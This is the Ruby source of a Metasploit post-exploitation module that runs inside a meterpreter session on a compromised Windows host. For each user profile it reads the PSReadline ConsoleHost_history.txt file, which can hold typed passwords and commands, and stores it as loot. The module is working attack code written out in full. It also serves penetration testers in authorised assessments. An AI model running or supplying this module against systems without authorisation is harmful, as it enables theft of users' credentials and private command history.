##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/user_profiles'

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Windows Gather PSReadline History',
      'Description' => %q{
        Gathers Power Shell history data from the target machine.
      },
      'License' => MSF_LICENSE,
      'Author' => [
        'Garvit Dewan <d.garvit[at]gmail.com>' # @dgarvit
      ],
      'Platform' => %w{ win },
      'SessionTypes' => [ 'meterpreter' ],
      'References'   => [
        ['URL', 'https://docs.microsoft.com/en-us/powershell/module/psreadline/'],
        ['URL', 'https://github.com/KalibRx/PoshHarvestPy/blob/master/poshharvest.py'],
        ['URL', 'https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html']
      ]
    ))
  end

  def run
    grab_user_profiles.each do |userprofile|
      next if userprofile['AppData'].blank?
      history_path = userprofile['AppData'] + "\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"
      next unless file?(history_path)
      gather_psreadline_history(userprofile['UserName'], history_path)
    end
  end

  #
  # Get the PSReadline history file.
  #
  def gather_psreadline_history(username, path)
    data = read_file(path)
    print_status("Writing history to loot...")
    file_loc = store_loot("ps.history", "text/plain", session, data)
    print_good("PSReadline history file of user #{username} saved to #{file_loc}")
  end
end
